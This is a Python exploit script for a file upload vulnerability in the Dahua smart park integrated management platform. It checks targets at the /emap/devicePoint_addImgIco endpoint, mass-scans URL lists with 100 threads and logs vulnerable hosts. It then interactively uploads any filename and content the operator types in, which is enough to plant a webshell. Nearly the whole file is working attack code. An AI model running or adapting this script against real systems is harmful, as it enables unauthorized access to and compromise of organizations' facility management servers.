import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______________  __                     _________   __________________     
___  __ \__  / / /  __________________ ______  /   ___  __/__(_)__  /____ 
__  / / /_  /_/ /   __  ___/  _ \  __ `/  __  /    __  /_ __  /__  /_  _ \
_  /_/ /_  __  /    _  /   /  __/ /_/ // /_/ /     _  __/ _  / _  / /  __/
/_____/ /_/ /_/     /_/    \___/\__,_/ \__,_/      /_/    /_/  /_/  \___/ 
                                                                          """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='大华智慧园区综合管理平台 文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload1 = '/emap/devicePoint_addImgIco?hasSubsystem=true'
    headers1 = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'Upgrade-Insecure-Requests':'1',
    }
    try:
        res1 = requests.get(url=target+payload1,headers=headers1,verify=False,timeout=10)
        if res1.status_code == 200 and '上传图片失败' in res1.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        return False

def exp(target):
    print('--------请稍候--------')
    time.sleep(2)

    while True:
        filename = input('请输入要上传的文件名')
        content = input('请输入文件内容')
        
        try:
            if filename == 'q' or content == 'q':
                exit()
            payload2 = '/emap/devicePoint_addImgIco?hasSubsystem=true'
            headers2 = {
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
                'Accept':'*/*',
                'Accept-Language':'en-US,en;q=0.5',
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Upgrade-Insecure-Requests':'1',
                'Sec-Fetch-Dest':'document',
                'Sec-Fetch-Mode':'navigate',
                'Sec-Fetch-Site':'none',
                'Sec-Fetch-User':'?1',
                'Content-Type':'multipart/form-data; boundary=---------------------------23866052015499226143339905740',
                'Content-Length':'1176',
            }
            data = f'-----------------------------23866052015499226143339905740\r\nContent-Disposition: form-data; name="upload"; filename="{filename}"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n{content}\r\n-----------------------------23866052015499226143339905740--'
            res2 = requests.post(url=target+payload2,headers=headers2,data=data,verify=False,timeout=10)
            match = re.findall('"data":"(.*?)"',res2.text,re.S)[0]
            if res2.status_code == 200 and 'data' in res2.text:
                print(f'[+]文件上传成功：{target}/upload/emap/society_new/{match}')
            else:
                print('上传失败')
        except Exception as e:
            print('上传异常')
            return False

if __name__ == '__main__':
    main()